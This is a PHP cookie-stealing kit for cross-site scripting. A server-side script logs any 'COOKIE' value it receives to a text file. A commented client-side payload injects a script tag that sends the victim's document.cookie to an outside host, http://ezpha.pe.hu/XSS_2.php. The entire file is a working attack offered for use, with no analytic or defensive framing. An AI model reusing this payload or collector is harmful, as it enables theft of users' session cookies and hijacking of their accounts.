<?php

// #_# Server Side #_#

if (isset($_GET['COOKIE']) && !empty($_GET['COOKIE']))
{
  $cs=$_GET['COOKIE'];
  $ck = fopen('atome.txt','a');
  fputs($ck,$cs);
  fclose($ck);
}
else
{
  $cf = fopen('atome.txt','a');
  fputs($cf,'no');
  fclose($cf);
}
?>

<!--
#_# Client Side #_#

#_#PAYLOAD#_#    "><script>window.open("http://ezpha.pe.hu/XSS_2.php?COOKIE="%2Bdocument.cookie)</script>

-->

